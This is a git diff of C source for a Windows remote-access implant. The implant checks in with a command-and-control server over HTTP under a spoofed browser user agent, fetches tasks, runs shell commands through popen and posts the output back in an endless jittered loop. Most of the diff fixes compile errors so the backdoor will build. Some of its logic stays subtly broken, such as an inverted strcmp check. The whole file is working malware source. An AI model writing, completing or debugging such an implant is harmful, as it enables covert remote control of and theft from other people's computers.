@@ -6,6 +6,17 @@
 #include <stdio.h>
 #include <string.h>
 #include "cJSON.h"
+
+
+
+char* handle_shell_cmd(cJSON *task);
+void dispatcher(cJSON *task);
+bool sleep_with_jitter(int interval, int jitter);
+void get_tasks();
+void checkin();
+char* send_c2_post_request(char* json_data);
+
+
 typedef struct {
     int port; 
     int interval; 
@@ -23,12 +34,12 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
-typedef struct {
-char cmd[20];
-char params[30];
-double ts;
-char uuid[37];
-} task;
+//typedef struct {
+//char cmd[20];
+//char params[30];
+//double ts;
+//char uuid[37];
+//} task;
 
 char json_buff[250];
 
@@ -68,13 +79,13 @@ implant_config config = {
 
 char* send_c2_post_request(char* json_data) {
     HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return;
+    if (!hInternet) return "";
 
     HINTERNET hConnect = InternetConnect(hInternet, config.host, config.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) { InternetCloseHandle(hInternet); return; }
+    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }
 
     HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }
+    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
 
     const char* headers = "Content-Type: application/json\r\n";
     
@@ -87,15 +98,19 @@ char* send_c2_post_request(char* json_data) {
             char* response = (char*)malloc(bytesRead+1);
             memcpy(response,buffer,bytesRead);
             response[bytesRead] = '\0';
+            InternetCloseHandle(hRequest);
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
             return response;
+            
         }
     }
-
-    InternetCloseHandle(hRequest);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
+return "";
+   // InternetCloseHandle(hConnect);
+   // InternetCloseHandle(hInternet);
+   // InternetCloseHandle(hRequest);
 }
-char* checkin(){
+void checkin(){
         char json_checkin_buff[190];
     snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
     char* resp = send_c2_post_request(json_checkin_buff); //checkin do serwera
@@ -114,7 +129,7 @@ char* checkin(){
 }
 	
 void get_tasks(){
-char* tasks_json = send_c2_post_request('{"action": "get_tasking", "tasking_size": -1}');
+char* tasks_json = send_c2_post_request("{\"action\": \"get_tasking\", \"tasking_size\": -1}");
 cJSON *root = cJSON_Parse(tasks_json);
 if (root != NULL) {
 cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
@@ -140,7 +155,7 @@ return 0;
 }
 
 void dispatcher(cJSON *task){
-    if strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell"){
+    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
         char* command_output = handle_shell_cmd(task);
         cJSON *root = cJSON_CreateObject();
         cJSON_AddStringToObject(root,"action","post_response");
@@ -156,16 +171,18 @@ void dispatcher(cJSON *task){
         send_c2_post_request(command_executed);
         free(command_executed);
         free(command_output);
+        free(root);
     }
     else{
-        printf(":( unknown command detected\n");
+        printf(":( unknown command:\n");
+            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
     }
 
 }
 
 char* handle_shell_cmd(cJSON *task){
      FILE *fp;
-     char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring
+     char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring;
      char output[512];
 
      fp = popen(command,"r"); 
@@ -174,17 +191,17 @@ char* handle_shell_cmd(cJSON *task){
 
 char* ret_val = (char*)malloc(read+1);
 strncpy(ret_val,output,read+1);
+return ret_val;
 }
 
 int main(){
 	checkin();
 //main loop
-    for(;;){
+abc:
         get_tasks();
         
         sleep_with_jitter(config.interval,config.jitter);
-
-    }
+goto abc;
 
 	return 0;
 }
